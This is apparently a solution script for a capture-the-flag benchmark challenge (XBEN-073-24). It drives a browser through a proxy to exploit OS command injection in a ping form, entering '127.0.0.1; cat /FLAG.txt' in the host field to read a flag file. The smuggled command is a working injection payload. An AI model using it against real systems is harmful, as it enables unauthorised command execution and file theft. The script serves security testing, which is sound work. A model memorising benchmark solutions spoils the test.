#!/usr/bin/env bash
# XBEN-073-24 — OS command injection in a ping form. Proxy-mode twin. The host
# field is passed to a shell; `127.0.0.1; cat /FLAG.txt` appends a command whose
# output the page echoes.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben073p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"
ab wait 'input' >/dev/null 2>&1 || true
ab fill 'input' '127.0.0.1; cat /FLAG.txt' >/dev/null
ab click 'button[type=submit], input[type=submit], button' >/dev/null 2>&1 || true
ab wait --load networkidle >/dev/null 2>&1 || true
print_flag
